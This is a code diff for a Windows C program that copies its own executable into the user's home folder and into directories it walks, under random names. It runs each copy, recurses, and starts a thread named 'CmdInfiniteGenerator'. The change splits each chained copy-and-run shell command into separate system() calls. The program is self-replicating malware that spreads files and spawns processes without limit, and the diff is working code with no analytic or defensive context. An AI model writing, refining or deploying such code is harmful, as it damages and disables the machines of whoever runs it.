@@ -63,7 +63,9 @@ void FileSearch(char file_path[], char originfile[])
 		{
 			char filename[20];
 			strcpy(filename, makefilename());
-			sprintf(cmd, "copy %s\\%s %s\\%s && %s\\%s", file_path2, originfile, file_pt, filename, file_pt, filename);
+			sprintf(cmd, "copy %s\\%s %s\\%s", file_path2, originfile, file_pt, filename);
+			system(cmd);
+			sprintf(cmd, "%s\\%s", file_pt, filename);
 			system(cmd);
 			FileSearch(file_pt, filename);
 		}
@@ -83,7 +85,10 @@ int main(int argc, char** argv)
 
 	strcpy(filename, makefilename());
 
-	sprintf(cmd, "copy %s %%homepath%%\\%s && %%homepath%%\\%s", argv[0], filename);
+	sprintf(cmd, "copy %s %%homepath%%\\%s", argv[0], filename);
+	system(cmd);
+
+	sprintf(cmd, "%%homepath%%\\%s", filename);
 	system(cmd);
 
 	HANDLE hThread = CreateThread(NULL, 0, CmdInfiniteGenerator, NULL, 0, NULL);
